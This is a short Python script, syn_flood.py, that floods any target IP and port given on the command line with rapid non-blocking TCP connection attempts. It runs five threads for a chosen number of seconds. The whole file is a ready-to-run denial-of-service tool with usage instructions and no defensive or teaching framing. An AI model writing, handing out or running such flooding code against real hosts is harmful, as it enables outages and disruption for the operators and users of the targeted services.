import socket
import sys
import time
from threading import Thread
#creates a SYN packet using a non blocking TCP connection
def create_syn_packet(target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        s.connect_ex((target_ip, target_port)) #sends the SYN packet
        s.close() 
    except:
        pass #ignores socket errors
 #continuously sends SYN packets to the target for the specified duration
def syn_flood(target_ip, target_port, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        create_syn_packet(target_ip, target_port)
#main function to parse the arguments and launch threads for the SYN flood
def main():
    if len(sys.argv) != 4:
        print("Usage: python syn_flood.py <target_ip> <target_port> <duration_in_seconds>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])

    print(f"Starting SYN flood on {target_ip}:{target_port} for {duration} seconds...")

    threads = []
    for _ in range(5): #launches 5 threads to increase the flood rate
        t = Thread(target=syn_flood, args=(target_ip, target_port, duration))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("SYN flood completed.")

if __name__ == "__main__":
    main()
